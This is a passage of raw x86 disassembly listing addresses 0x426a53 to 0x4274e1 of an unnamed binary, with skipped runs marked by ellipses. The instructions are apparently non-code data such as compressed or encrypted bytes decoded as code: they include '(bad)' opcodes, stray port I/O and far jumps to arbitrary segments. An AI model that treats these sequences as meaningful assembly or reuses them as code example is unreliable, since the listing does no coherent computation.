  426a53:	jo     0x426a6a
  426a55:	add    BYTE PTR [ebp+0x51707333],0x40
  426a5c:	fbld   TBYTE PTR [edi-0x5a]
  426a5f:	dec    edx
  426a60:	sub    ch,BYTE PTR fs:[ecx-0x2d7b40b4]
  426a67:	mov    ebx,0xeb60275e
  426a6c:	loope  0x426a2c
  426a6e:	outs   dx,DWORD PTR ds:[esi]
  426a6f:	and    eax,0x82da8565
  426a74:	jne    0x426a45
  426a76:	aam    0xcb
  426a78:	sahf   
  426a79:	xlat   BYTE PTR ds:[ebx]
  426a7a:	add    eax,0xd84145b4
  426a7f:	mov    eax,ds:0xb380d7fc
  426a84:	gs pop eax
  426a86:	mov    ah,0x4d
  426a88:	xchg   esi,eax
  426a89:	int    0x9a
  426a8b:	push   es
  426a8c:	pop    es
  426a8d:	xor    ah,bh
  426a8f:	hlt    
  426a90:	sbb    esp,esp
  426a92:	cmp    eax,0xf87e8afe
  426a97:	and    bh,BYTE PTR [edi+0x71e1460c]
  426a9d:	add    eax,0xe8e4e43d
  426aa2:	xchg   ebx,eax
  426aa3:	leave  
  426aa4:	jns    0x426a7d
  426aa6:	in     eax,dx
  426aa7:	mov    cl,bh
  426aa9:	xchg   esp,ebx
  426aab:	scas   al,BYTE PTR es:[edi]
  426aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426aad:	dec    esi
  426aae:	sbb    eax,0xeeb88da9
  426ab3:	mov    al,0x9c
  426ab5:	in     al,dx
  426ab6:	lahf   
  426ab7:	lds    esp,FWORD PTR [ebx-0x7e]
  426aba:	pop    es
  426abb:	hlt    
  426abc:	inc    esp
  426abd:	xlat   BYTE PTR ds:[ebx]
  426abe:	fiadd  WORD PTR [esp+ebx*2+0x50896d76]
  426ac5:	and    ecx,edx
  426ac7:	gs test al,0xbc
  426aca:	pop    edi
  426acb:	sub    al,cl
  426acd:	mov    ds:0xab754cf6,eax
  426ad2:	lahf   
  426ad3:	clc    
  426ad4:	jae    0x426b1d
  426ad6:	push   edi
  426ad7:	pop    edx
  426ad8:	(bad)  
  426ad9:	fsub   QWORD PTR [ebx+0x5]
  426adc:	jmp    0x426a62
  426ade:	push   esi
  426adf:	jb     0x426ae3
  426ae1:	push   cs
  426ae2:	lods   al,BYTE PTR ds:[esi]
  426ae3:	xor    al,0xe1
  426ae5:	jmp    0xf9f6:0x676c7213
  426aec:	das    
  426aed:	out    0x0,eax
	...
  426b53:	add    BYTE PTR [eax],al
  426b55:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426b5b:	ja     0x426b38
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x23
  426b63:	inc    ebp
  426b64:	push   ebp
  426b65:	pop    eax
  426b66:	addr16 lahf 
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	dec    ecx
  426b6f:	push   esi
  426b70:	lock mov eax,ds:0x25737423
  426b76:	mov    ds:0x7372f0c2,eax
  426b7b:	push   es
  426b7c:	ss inc esi
  426b7e:	jne    0x426b02
  426b80:	mov    ebx,0x138d8f3f
  426b85:	cmp    al,0xd7
  426b87:	sbb    eax,0x32e82e3c
  426b8c:	lock push ss
  426b8e:	sbb    edx,DWORD PTR [ebx+0x3b23669d]
  426b94:	inc    esp
  426b95:	push   esp
  426b96:	mov    ebp,0xb7108d40
  426b9b:	aad    0xb3
  426b9d:	mov    ecx,0x22240987
  426ba2:	pop    ds
  426ba3:	mov    ch,bh
  426ba5:	aaa    
  426ba6:	pop    eax
  426ba7:	cmp    ebp,DWORD PTR [esi+0x1f]
  426baa:	and    edi,eax
  426bac:	dec    ecx
  426bad:	lea    ecx,[ebx-0x55]
  426bb0:	mov    BYTE PTR [esi+0x2d0de2a4],al
  426bb6:	js     0x426b3b
  426bb8:	xor    BYTE PTR [eax],cl
  426bba:	or     DWORD PTR [esi+0x2de61d5c],0x8c62d4fa
  426bc4:	jl     0x426c27
  426bc6:	retf   
  426bc7:	daa    
  426bc8:	push   eax
  426bc9:	loopne 0x426bfb
  426bcb:	add    BYTE PTR ds:0x83a6b47c,cl
  426bd1:	loope  0x426b6a
  426bd3:	in     al,0x3b
  426bd5:	or     DWORD PTR [esi],0x55
  426bd8:	mov    esp,0x7fc872e4
  426bdd:	sub    al,0x26
  426bdf:	cwde   
  426be0:	ss push ds
  426be2:	lods   al,BYTE PTR ds:[esi]
  426be3:	rcr    DWORD PTR [edi],cl
  426be5:	(bad)  
  426be6:	jb     0x426bf5
  426be8:	sub    eax,0x5a98727f
  426bed:	sub    dh,ch
  426bef:	sbb    BYTE PTR [edx],dl
  426bf1:	dec    esp
  426bf2:	lods   al,BYTE PTR ds:[esi]
  426bf3:	pop    edi
  426bf4:	je     0x426bba
  426bf6:	call   0xb8c2:0x22b4a2c9
  426bfd:	cdq    
  426bfe:	inc    edi
  426bff:	dec    esi
  426c00:	test   DWORD PTR [esi+0x1e081729],edi
  426c06:	rcl    DWORD PTR [eax+0x76],0x42
  426c0a:	jne    0x426c3e
  426c0c:	jb     0x426c3a
  426c0e:	push   cs
  426c0f:	gs mov al,dh
  426c12:	add    esp,esi
  426c14:	je     0x426bd2
  426c16:	stc    
  426c17:	icebp  
  426c18:	and    BYTE PTR [eax],al
  426c1a:	ds iret 
  426c1c:	outs   dx,DWORD PTR ds:[esi]
  426c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c1e:	inc    ecx
  426c1f:	inc    esp
  426c20:	data16 rol BYTE PTR [ebx+0x7b],cl
  426c24:	aaa    
  426c25:	lock mov bl,0x1b
  426c28:	and    eax,0xf7a88e5b
  426c2d:	push   cs
  426c2e:	pop    ebp
  426c2f:	sbb    edi,DWORD PTR [edi+0x6d]
  426c32:	mov    eax,ds:0x10d76a7a
  426c37:	and    ebx,DWORD PTR [ebp+0x46]
  426c3a:	fnsave [edx]
  426c3c:	or     eax,0x3f15ee38
  426c41:	dec    eax
  426c42:	xor    edx,esp
  426c44:	jle    0x426bf9
  426c46:	mov    esi,DWORD PTR [edx-0x28]
  426c49:	pop    edx
  426c4a:	into   
  426c4b:	ja     0x426c59
  426c4d:	pop    edi
  426c4e:	add    dh,al
  426c50:	adc    BYTE PTR [esi],al
  426c52:	cmp    eax,0xedc71b9e
  426c57:	shl    DWORD PTR [ebp+0x6b],cl
  426c5a:	cmp    DWORD PTR ds:0xd3bef631,ebx
  426c60:	popf   
  426c61:	jle    0x426c2b
  426c63:	or     DWORD PTR [eax+ebp*2+0x49],0xffffffd9
  426c68:	mov    ebx,0x690df70a
  426c6d:	mov    al,0x0
	...
  426cd3:	add    BYTE PTR [eax],al
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x3927c367
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	inc    ecx
  426cef:	stos   BYTE PTR es:[edi],al
  426cf0:	sbb    DWORD PTR [eax],ebx
  426cf2:	cld    
  426cf3:	inc    edi
  426cf4:	arpl   ax,bx
  426cf6:	xchg   ebx,eax
  426cf7:	lods   eax,DWORD PTR ds:[esi]
  426cf8:	fsubr  DWORD PTR [edi+0x68]
  426cfb:	cmp    al,0xbc
  426cfd:	rcl    al,0xc0
  426d00:	fisub  DWORD PTR [ebx+eax*4+0x2c8af6c1]
  426d07:	mov    ebx,0x8019d543
  426d0c:	jns    0x426ce5
  426d0e:	ja     0x426d39
  426d10:	mov    dl,0xd1
  426d12:	pop    ebp
  426d13:	push   esp
  426d14:	retf   
  426d15:	push   eax
  426d16:	push   edx
  426d17:	shl    DWORD PTR [eax+0x44],cl
  426d1a:	or     al,0xb1
  426d1c:	sbb    eax,0xdc61300e
  426d21:	xor    eax,esi
  426d23:	jb     0x426d75
  426d25:	ret    0xdeef
  426d28:	je     0x426d40
  426d2a:	lea    ecx,[ecx+0x22aef496]
  426d30:	sub    BYTE PTR [edx],ch
  426d32:	sti    
  426d33:	iret   
  426d34:	loopne 0x426d61
  426d36:	outs   dx,DWORD PTR ds:[esi]
  426d37:	pop    ebp
  426d38:	or     BYTE PTR [eax],al
  426d3a:	jmp    0x426d5f
  426d3c:	test   BYTE PTR [edi+0x1e],bh
  426d3f:	in     al,0xd6
  426d41:	mov    edx,0x2e07d1b9
  426d46:	(bad)  
  426d47:	out    0x27,eax
  426d49:	mov    ds:0xab4536ad,eax
  426d4e:	adc    al,0xf9
  426d50:	add    edx,ebp
  426d52:	inc    ebp
  426d53:	adc    DWORD PTR [ecx+0x2b2c2aac],0xffffffea
  426d5a:	or     edi,esp
  426d5c:	popf   
  426d5d:	popa   
  426d5e:	shr    DWORD PTR [edx],0xa4
  426d61:	add    eax,0x59a04f1a
  426d66:	xchg   BYTE PTR [eax-0x6a723604],cl
  426d6c:	xor    DWORD PTR [edi-0x4709c838],ecx
  426d72:	out    0xc5,eax
  426d74:	inc    ecx
  426d75:	dec    ecx
  426d76:	xchg   DWORD PTR [ebp-0x55],ebp
  426d79:	cmp    BYTE PTR [ebp-0x50],ah
  426d7c:	dec    eax
  426d7d:	adc    BYTE PTR [esi-0x405fd70c],dh
  426d83:	pop    eax
  426d84:	dec    esp
  426d85:	mov    ds:0x5f8d7e2b,eax
  426d8a:	xor    dl,BYTE PTR [edi+0x2e]
  426d8d:	inc    esp
  426d8e:	ret    0xf19e
  426d91:	cmp    eax,ebx
  426d93:	lock cli 
  426d95:	and    eax,DWORD PTR [ebx+0x1975761c]
  426d9b:	pop    ebx
  426d9c:	push   ebx
  426d9d:	fild   QWORD PTR [ebp+0x1b]
  426da0:	leave  
  426da1:	data16 fdiv st(3),st
  426da4:	and    al,0xa3
  426da6:	push   edx
  426da7:	js     0x426e1d
  426da9:	mov    cl,0x97
  426dab:	(bad)  [ebx-0x2aaa5a26]
  426db1:	lahf   
  426db2:	sbb    BYTE PTR [ebp-0x7cf335a6],dl
  426db8:	sar    dh,0x5b
  426dbb:	mov    cl,0x44
  426dbd:	rol    cl,1
  426dbf:	mov    dl,0x91
  426dc1:	or     BYTE PTR [ebx+eiz*2-0x5ebfafb],0x3c
  426dc9:	ins    DWORD PTR es:[edi],dx
  426dca:	cli    
  426dcb:	or     esp,DWORD PTR [ebp-0x2a]
  426dce:	pop    ebp
  426dcf:	out    dx,al
  426dd0:	outs   dx,BYTE PTR ds:[esi]
  426dd1:	or     BYTE PTR [ebp+eiz*1+0x75],bl
  426dd5:	cli    
  426dd6:	gs cld 
  426dd8:	retf   
  426dd9:	jmp    0xae92ab3f
  426dde:	lea    edx,[edi]
  426de0:	dec    ebp
  426de1:	cmp    DWORD PTR [esi-0x1d],esp
  426de4:	xchg   esp,eax
  426de5:	xchg   ecx,eax
  426de6:	hlt    
  426de7:	jl     0x426d75
  426de9:	out    dx,al
  426dea:	sbb    eax,0xb7ec7f
	...
  426e53:	add    BYTE PTR [eax],al
  426e55:	add    BYTE PTR [edx],cl
  426e57:	mov    cl,0x61
  426e59:	repz sti 
  426e5b:	repz call 0x500c:0xc7c2ecf9
  426e63:	cli    
  426e64:	repz jnp 0x426ece
  426e67:	mov    eax,ds:0x1000001
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	or     DWORD PTR ds:0xe868618f,eax
  426e74:	les    ebx,FWORD PTR [ebx-0x3]
  426e77:	popf   
  426e78:	pop    es
  426e79:	jmp    0x5a0:0x8e7d3e5d
  426e80:	dec    ebx
  426e81:	cmp    bl,BYTE PTR [ebx+ecx*1+0x78]
  426e85:	loope  0x426e98
  426e87:	cwde   
  426e88:	mov    ebp,0xd6703f2c
  426e8d:	rol    DWORD PTR [ecx],0x3a
  426e90:	cmp    BYTE PTR [ecx],dl
  426e92:	mov    ch,0x77
  426e94:	sti    
  426e95:	or     al,0xa4
  426e97:	pop    esi
  426e98:	push   ecx
  426e99:	popf   
  426e9a:	out    dx,eax
  426e9b:	push   ebx
  426e9c:	in     al,dx
  426e9d:	rol    BYTE PTR [ecx],cl
  426e9f:	add    BYTE PTR [ebx-0x29],0x3c
  426ea3:	sbb    eax,0x957cf61a
  426ea8:	push   ss
  426ea9:	or     BYTE PTR [edi-0x37540d0e],cl
  426eaf:	je     0x426eb5
  426eb1:	inc    ebp
  426eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eb3:	retf   0xecc0
  426eb6:	sub    ecx,DWORD PTR [eax]
  426eb8:	(bad)  
  426eb9:	retf   
  426eba:	mov    ds:0xe99b04ee,eax
  426ebf:	jecxz  0x426e96
  426ec1:	mov    al,ds:0x5638acc3
  426ec6:	sbb    DWORD PTR [ebx+edi*4-0x4d],eax
  426eca:	jbe    0x426eb6
  426ecc:	mov    dl,BYTE PTR [eax-0xa]
  426ecf:	aas    
  426ed0:	pop    es
  426ed1:	mov    ebp,DWORD PTR [eax]
  426ed3:	mov    al,ds:0x4701d472
  426ed8:	in     eax,0x4f
  426eda:	in     al,0x5
  426edc:	xchg   edi,eax
  426edd:	aam    0xf5
  426edf:	inc    ebp
  426ee0:	ret    
  426ee1:	pop    ds
  426ee2:	inc    ebx
  426ee3:	inc    edx
  426ee4:	pop    eax
  426ee5:	and    esp,edx
  426ee7:	test   BYTE PTR [ecx],cl
  426ee9:	add    DWORD PTR [ecx],ecx
  426eeb:	mov    ds:0xc2b1670b,al
  426ef0:	sub    DWORD PTR [ebp-0x26],ebx
  426ef3:	push   ebp
  426ef4:	sub    ebx,ebx
  426ef6:	retf   
  426ef7:	jbe    0x426f67
  426ef9:	in     eax,0x6c
  426efb:	jno    0x426ebc
  426efd:	test   al,0x63
  426eff:	ins    BYTE PTR es:[edi],dx
  426f00:	pushf  
  426f01:	in     eax,0x6b
  426f03:	out    dx,al
  426f04:	cmc    
  426f05:	test   BYTE PTR [ebx-0x5d],dh
  426f08:	mov    ch,0x1e
  426f0a:	repnz inc ebx
  426f0c:	shl    DWORD PTR [esi],0x7d
  426f0f:	pcmpgtw mm0,QWORD PTR [esp+edx*1+0x7a]
  426f14:	jmp    0x426f7a
  426f16:	or     dh,BYTE PTR [esi+0x595d3057]
  426f1c:	sbb    BYTE PTR [esi-0x79],bh
  426f1f:	mov    DWORD PTR [ebx+ebx*8-0x61],ebp
  426f23:	leave  
  426f24:	push   ss
  426f25:	fcomp  QWORD PTR [ebx+0x615e9acd]
  426f2b:	imul   ebp,DWORD PTR [esi],0xb1dd506c
  426f31:	adc    al,0x4e
  426f33:	mov    bh,0x34
  426f35:	fcmovb st,st(0)
  426f37:	pop    ebp
  426f38:	inc    ebx
  426f39:	pop    esi
  426f3a:	int3   
  426f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f3c:	mov    ds:0xecc7860e,al
  426f41:	mov    dh,0xbc
  426f43:	(bad)  
  426f44:	(bad)  
  426f45:	scas   al,BYTE PTR es:[edi]
  426f46:	and    ch,BYTE PTR [edi-0x6d052d5a]
  426f4c:	cmp    al,0x48
  426f4e:	iret   
  426f4f:	and    ah,BYTE PTR [eax-0x61]
  426f52:	or     al,0x5c
  426f54:	jmp    0x54b9:0xaf9a3c7f
  426f5b:	div    bh
  426f5d:	cmp    BYTE PTR [ecx-0x4d],al
  426f60:	fadd   QWORD PTR [edx+0x749757b7]
  426f66:	fimul  WORD PTR [ecx+ecx*2+0x58199de4]
  426f6d:	add    DWORD PTR [eax],eax
	...
  426fd3:	add    BYTE PTR [eax],al
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [ebx+edi*4+0x676c8f4f],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	jge    0x427053
  426ff0:	in     al,0xd8
  426ff2:	adc    ecx,DWORD PTR [esi+ebp*8]
  426ff5:	xor    eax,0xcd640678
  426ffa:	mul    BYTE PTR [ebx]
  426ffc:	xchg   ebp,eax
  426ffd:	or     al,0xd9
  426fff:	adc    BYTE PTR [eax-0x1c113a6f],dl
  427005:	jae    0x42703f
  427007:	jmp    0xcd8a04bd
  42700c:	push   ebx
  42700d:	nop
  42700e:	call   0xbfa067a
  427013:	sub    ecx,DWORD PTR [esi+0x57b1a03b]
  427019:	fist   DWORD PTR [edi+0x75]
  42701c:	cmp    dl,BYTE PTR [edx+ecx*2+0x3fa4fb59]
  427023:	and    DWORD PTR [ecx-0x6a497d51],0xa953a98f
  42702d:	leave  
  42702e:	aas    
  42702f:	mov    eax,0xf8d3f0b8
  427034:	ins    BYTE PTR es:[edi],dx
  427035:	inc    eax
  427036:	dec    ebp
  427037:	cmp    ah,dh
  427039:	jp     0x42703b
  42703b:	ficom  WORD PTR [edi-0x22218793]
  427041:	sub    al,0x82
  427043:	mov    edx,0xfd5f07ae
  427048:	and    al,0x50
  42704a:	(bad)  
  42704b:	pushf  
  42704c:	xor    ebp,DWORD PTR [ecx-0x1bd67f36]
  427052:	add    ch,ah
  427054:	shl    eax,1
  427056:	or     esp,0x38
  427059:	fisub  DWORD PTR ds:0xc14b451f
  42705f:	inc    edi
  427060:	mov    WORD PTR [ebp-0x55630e4a],fs
  427066:	add    BYTE PTR [edi-0x10],ah
  427069:	pop    ebx
  42706a:	retf   
  42706b:	push   ss
  42706c:	mov    edi,0xafb0cd8d
  427071:	dec    esi
  427072:	ret    0x9499
  427075:	mov    cl,0xcc
  427077:	je     0x42704b
  427079:	mov    ah,0x4e
  42707b:	sbb    edx,DWORD PTR [ebx+0x6fa67d53]
  427081:	jmp    0x4270bf
  427083:	and    BYTE PTR [ebp+0x1505dd0f],cl
  427089:	pop    esi
  42708a:	jl     0x4270c0
  42708c:	std    
  42708d:	fstp   DWORD PTR [ebx+0x55]
  427090:	add    DWORD PTR [eax+0x687bad61],edx
  427096:	test   esp,esp
  427098:	jns    0x427106
  42709a:	das    
  42709b:	inc    edx
  42709c:	and    al,BYTE PTR [edx]
  42709e:	or     esp,ebp
  4270a0:	sub    ah,BYTE PTR [ebx-0x54bb9fcc]
  4270a6:	sbb    al,0xb0
  4270a8:	jg     0x427121
  4270aa:	inc    DWORD PTR [esi+0x642d1ef1]
  4270b0:	xchg   ebp,eax
  4270b1:	or     al,0x27
  4270b3:	aad    0xc8
  4270b5:	in     al,0xaf
  4270b7:	add    ebx,DWORD PTR [ebp-0x5b8d486a]
  4270bd:	stos   DWORD PTR es:[edi],eax
  4270be:	push   eax
  4270bf:	loopne 0x4270a2
  4270c1:	bound  ecx,QWORD PTR [esp+ebx*4-0x1c]
  4270c5:	sub    DWORD PTR [edx-0x16847b73],0xd9b23ffd
  4270cf:	adc    al,BYTE PTR [edi-0x1a8deda5]
  4270d5:	sbb    edi,edx
  4270d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270d8:	or     al,0x1b
  4270da:	fldcw  WORD PTR ss:[ebx-0x3a]
  4270de:	js     0x4270ae
  4270e0:	in     al,0x8c
  4270e2:	(bad)  
  4270e3:	dec    edi
  4270e4:	dec    esi
  4270e5:	nop
  4270e6:	pop    edi
  4270e7:	out    0x3a,eax
  4270e9:	shl    BYTE PTR [esi+0x75],cl
  4270ec:	jbe    0x4270d4
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x7c739d96
  427164:	jb     0x427114
  427166:	addr16 mov ds:0x1,eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	mov    esp,0xa52ce63b
  427173:	or     ebx,DWORD PTR [ecx+0x16cc321e]
  427179:	(bad)  
  42717b:	dec    ebp
  42717c:	loop   0x427183
  42717e:	dec    edx
  42717f:	mov    DWORD PTR [ecx-0x70916d87],esp
  427185:	ss pop ss
  427187:	dec    edx
  427188:	mov    bh,0x84
  42718a:	fsub   st(1),st
  42718c:	ret    
  42718d:	sub    eax,0xf8d8ba6f
  427192:	xchg   esi,eax
  427193:	xchg   ebp,eax
  427194:	add    DWORD PTR [eax-0x9e7a4d0],edx
  42719a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42719b:	or     BYTE PTR [esi],0xea
  42719e:	loopne 0x427122
  4271a0:	mov    ah,0x23
  4271a2:	jmp    0x4dc1:0xd5ca1547
  4271a9:	sbb    eax,0xd8f9c410
  4271ae:	(bad)  
  4271af:	adc    DWORD PTR [edi+0x33d3770b],ebx
  4271b5:	je     0x42715f
  4271b7:	(bad)  
  4271b8:	iret   
  4271b9:	push   0xc4d4d417
  4271be:	sub    DWORD PTR [esi],esi
  4271c0:	mov    DWORD PTR [esi+esi*4-0x1b016591],eax
  4271c7:	dec    esi
  4271c8:	jecxz  0x42720e
  4271ca:	jg     0x42718c
  4271cc:	sub    BYTE PTR [ecx-0x716ea214],ch
  4271d2:	inc    edi
  4271d3:	mov    eax,ds:0x1c1d4b1a
  4271d8:	test   eax,0xb41c3400
  4271dd:	inc    edi
  4271de:	push   es
  4271df:	and    al,0xa2
  4271e1:	enter  0x1e83,0xd5
  4271e5:	sti    
  4271e6:	out    0x6b,eax
  4271e8:	sbb    dh,BYTE PTR [eax+0xe]
  4271eb:	punpckhbw mm6,QWORD PTR [eax]
  4271ee:	jge    0x427193
  4271f0:	inc    ebx
  4271f1:	fild   DWORD PTR [ecx+ecx*2]
  4271f4:	pop    ds
  4271f5:	dec    ebx
  4271f6:	pop    esi
  4271f7:	mov    bh,0xe8
  4271f9:	fs cmp al,0xe5
  4271fc:	mov    ebp,0x50bb2b
  427201:	test   eax,0xfcb7fe23
  427206:	fidivr WORD PTR [eax-0x54]
  427209:	sahf   
  42720a:	and    DWORD PTR [edx-0x7f32ae34],edx
  427210:	sbb    esp,DWORD PTR [ecx*4-0x17e66e3f]
  427217:	mov    ch,0x9a
  427219:	jb     0x4271db
  42721b:	adc    bl,bh
  42721d:	mov    ch,0xb7
  42721f:	bound  ecx,QWORD PTR [ebx+0xee3f061]
  427225:	iret   
  427226:	test   ebp,edx
  427228:	stos   DWORD PTR es:[edi],eax
  427229:	sub    esp,DWORD PTR [esi]
  42722b:	cmp    bh,ch
  42722d:	test   DWORD PTR [edx-0x5c],ebx
  427230:	push   edx
  427231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427232:	jns    0x4271ec
  427234:	stc    
  427235:	jb     0x931743df
  42723b:	mov    ecx,0xc8ab8ae2
  427240:	mov    ch,BYTE PTR [ebp-0x1b0cff8a]
  427246:	sub    ebp,ecx
  427248:	pop    ebx
  427249:	lahf   
  42724a:	add    al,0x9
  42724c:	loope  0x4271f2
  42724e:	pop    ebx
  42724f:	scas   eax,DWORD PTR es:[edi]
  427250:	cdq    
  427251:	or     eax,0xffffffa2
  427254:	cmp    al,0x49
  427256:	mov    ebx,0xf8c975ae
  42725b:	fdivp  st(3),st
  42725d:	shr    DWORD PTR [ebp+0x3320e846],0x9d
  427264:	addr16 dec ecx
  427266:	in     eax,0x29
  427268:	fbstp  TBYTE PTR [ecx*4+0x6b6000]
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x76f235f,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	xchg   esp,eax
  4272ef:	xchg   DWORD PTR [esi],ebp
  4272f1:	scas   al,BYTE PTR es:[edi]
  4272f2:	cmc    
  4272f3:	je     0x4272a8
  4272f5:	stc    
  4272f6:	loop   0x427331
  4272f8:	pop    esp
  4272f9:	daa    
  4272fa:	dec    ebx
  4272fb:	ret    0xe5dd
  4272fe:	push   esp
  4272ff:	loope  0x427312
  427301:	clc    
  427302:	out    0xad,al
  427304:	jp     0x427346
  427306:	and    DWORD PTR [edx+0x7fd2b4b5],ecx
  42730c:	out    dx,eax
  42730d:	call   0xf14f:0x214b6ea9
  427314:	enter  0x1a11,0x61
  427318:	loop   0x427324
  42731a:	rcr    BYTE PTR [edi+0x63],0x13
  42731e:	js     0x4272f7
  427320:	mov    al,ds:0xb73dd78d
  427325:	outs   dx,DWORD PTR ds:[esi]
  427326:	jge    0x42739d
  427328:	stc    
  427329:	mov    edx,0x4be282c5
  42732e:	push   es
  42732f:	(bad)  
  427330:	in     al,0x6
  427332:	out    dx,al
  427333:	add    DWORD PTR [edi+eiz*2-0x5f2700f1],edx
  42733a:	(bad)  
  42733b:	mov    WORD PTR [edi+0x28],ds
  42733e:	stos   BYTE PTR es:[edi],al
  42733f:	stos   DWORD PTR es:[edi],eax
  427340:	les    ebx,FWORD PTR [edx]
  427342:	or     bl,BYTE PTR [ebx-0x34eda872]
  427348:	sub    al,0x13
  42734a:	add    DWORD PTR [esi],esi
  42734c:	adc    BYTE PTR [esi],al
  42734e:	jle    0x4273a6
  427350:	mov    dh,0xaf
  427352:	sar    DWORD PTR [ecx+esi*2+0x2f3ed4c4],0x6f
  42735a:	mov    bh,0x24
  42735c:	push   es
  42735d:	sub    eax,0x580390a6
  427362:	in     al,dx
  427363:	popa   
  427364:	cmp    BYTE PTR [ecx+0x5e],al
  427367:	or     BYTE PTR [ebx+0x7f76827a],0x9c
  42736e:	sahf   
  42736f:	shl    DWORD PTR [edi+0x5f749c03],1
  427375:	inc    esi
  427376:	icebp  
  427377:	pop    ds
  427378:	pop    ebp
  427379:	mov    ch,0x7c
  42737b:	jmp    0xe7c1:0xc0789b0d
  427382:	add    BYTE PTR [ebx-0x3b189c54],cl
  427388:	ins    BYTE PTR es:[edi],dx
  427389:	(bad)  
  42738a:	out    0x89,al
  42738c:	add    eax,0x5c295bf1
  427391:	dec    ebp
  427392:	push   esp
  427393:	ret    0x97fd
  427396:	cmc    
  427397:	ret    0xda68
  42739a:	fldcw  WORD PTR [ebx-0x21ae0f]
  4273a0:	test   eax,0x4c821a07
  4273a5:	inc    edx
  4273a6:	jecxz  0x4273ed
  4273a8:	pop    edi
  4273a9:	xchg   ebp,eax
  4273aa:	pop    ss
  4273ab:	mov    bh,0xd1
  4273ad:	dec    esi
  4273ae:	fnstcw WORD PTR [edx-0x623ee088]
  4273b4:	adc    al,0x19
  4273b6:	ja     0xc38e86dc
  4273bc:	lods   eax,DWORD PTR ds:[si]
  4273be:	(bad)  
  4273bf:	dec    ebx
  4273c0:	jns    0x4273c7
  4273c2:	pop    esi
  4273c3:	jne    0x4273da
  4273c5:	mov    ?,esp
  4273c7:	mov    bl,0x7c
  4273c9:	dec    esi
  4273ca:	xchg   ebp,eax
  4273cb:	pop    esi
  4273cc:	test   eax,0x90495f80
  4273d1:	popf   
  4273d2:	mov    eax,0x94d182f7
  4273d7:	or     al,0x61
  4273d9:	imul   edi,DWORD PTR [ebx-0x2d4942e3],0x50a024d3
  4273e3:	dec    edi
  4273e4:	hlt    
  4273e5:	fidiv  DWORD PTR [edi]
  4273e7:	aaa    
  4273e8:	lea    ebx,[edx]
  4273ea:	xchg   DWORD PTR [edx],edx
  4273ec:	push   ebp
  4273ed:	jae    0x4273ef
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esp,edx
  427463:	mov    al,0xcd
  427465:	adc    DWORD PTR [edi-0x5b],esp
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	jbe    0x427410
  427470:	std    
  427471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427472:	inc    esp
  427473:	push   ebp
  427474:	inc    edx
  427475:	add    dl,ch
  427477:	out    dx,al
  427478:	xchg   edx,eax
  427479:	xor    eax,edi
  42747b:	adc    DWORD PTR ds:0xcfe4eb5d,edx
  427481:	cmp    al,0x4a
  427483:	mov    dh,0x9d
  427485:	fnsave [ebp+edi*1-0x43]
  427489:	test   DWORD PTR [eax-0x29],0x8617ca67
  427490:	push   es
  427491:	out    0xf8,eax
  427493:	retf   0x1203
  427496:	cmp    ah,BYTE PTR [eax+esi*2-0x27cb4e04]
  42749d:	lds    ebp,FWORD PTR [esp+esi*8+0x3a1dd84c]
  4274a4:	push   esp
  4274a5:	out    dx,eax
  4274a6:	inc    ebp
  4274a7:	rcr    DWORD PTR [eax+esi*2+0x15a489fa],cl
  4274ae:	add    BYTE PTR [ebx+ebp*4],0x1f
  4274b2:	pop    ss
  4274b3:	retf   
  4274b4:	sub    DWORD PTR [ebp+0x60],ebp
  4274b7:	or     dh,BYTE PTR [edx-0x78]
  4274ba:	dec    ebx
  4274bb:	add    DWORD PTR [edx+0x3f1bc0ff],edi
  4274c1:	sub    DWORD PTR [esi],0xffffffef
  4274c4:	sbb    cl,BYTE PTR [esi]
  4274c6:	xor    eax,0x308008c7
  4274cb:	ja     0x4274a3
  4274cd:	ds loop 0x4274d8
  4274d0:	add    bl,BYTE PTR [ecx+ecx*4]
  4274d3:	(bad)  
  4274d4:	fs inc ebp
  4274d6:	jecxz  0x427552
  4274d8:	jnp    0x4274d8
  4274da:	hlt    
  4274db:	lods   eax,DWORD PTR cs:[esi]
  4274dd:	add    edx,DWORD PTR [esp+edi*2-0x1f]
  4274e1:	dec    esi
